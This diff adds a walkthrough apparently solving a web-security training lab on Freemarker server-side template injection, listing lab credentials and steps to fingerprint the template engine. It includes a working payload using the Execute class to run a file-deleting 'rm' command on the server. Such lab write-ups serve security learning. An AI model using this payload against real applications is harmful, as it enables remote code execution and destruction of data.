@@ -1,0 +1,41 @@
+Description:
+This lab is vulnerable to Server-Side Template Injection (SSTI).
+The goal is to identify the template engine, achieve code execution, and delete the target file.
+
+Steps to Solve:
+1️-Identify the Injection Point
+-Log in using:
+content-manager:C0nt3ntM4n4g3r
+-Navigate to product templates and edit a product description.
+-Notice the template syntax:
+${someExpression}
+
+2️-Identify the Template Engine
+-Inject an invalid expression:
+${foobar}
+-Save the template and observe the error message.
+-The error reveals that the application is using Freemarker.
+
+3️-Research Exploitation Method
+-From Freemarker documentation:
+The new() built-in can instantiate Java objects.
+-From JavaDoc:
+Look at classes implementing TemplateModel.
+-Find the class:
+freemarker.template.utility.Execute
+-This class allows execution of system commands.
+
+4️-Achieve Remote Code Execution (RCE)
+-Use the Execute class with new():
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
+
+5️-Exploit the Vulnerability
+-Replace the previous invalid payload with:
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
+-Save the template.
+-Reload the product page.
+
+Result:
+-Arbitrary command execution achieved
+-File deleted:
+/home/carlos/morale.txt
